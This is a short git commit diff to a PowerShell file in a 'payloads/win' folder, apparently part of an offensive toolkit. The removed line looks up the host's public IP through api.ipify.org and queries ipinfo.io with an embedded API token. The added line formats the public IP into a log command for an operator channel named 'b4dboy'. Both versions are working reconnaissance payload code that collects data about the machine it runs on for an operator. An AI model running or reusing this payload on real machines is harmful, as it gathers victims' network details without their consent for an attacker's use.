16eb333dd83ff5fd04927b421cfe204b2a7edce7
r4yX <108579252+r4yX@users.noreply.github.com>
2023-01-18 16:05:37 -0300

    Update ip.ps1

--- payloads/win/ip.ps1
+++ payloads/win/ip.ps1
@@ -1,1 +1,1 @@
-$pubip=curl.exe -s https://api.ipify.org; $ipdata=curl.exe -s "ipinfo.io/"+$pubip+"?token=a70e36470018f5"
+$pubip=curl.exe -s https://api.ipify.org; $ipdata="on b4dboy : log -m:<id> pubip="+$pubip+" -g:<id> ip="+$pubip; echo $ipdata
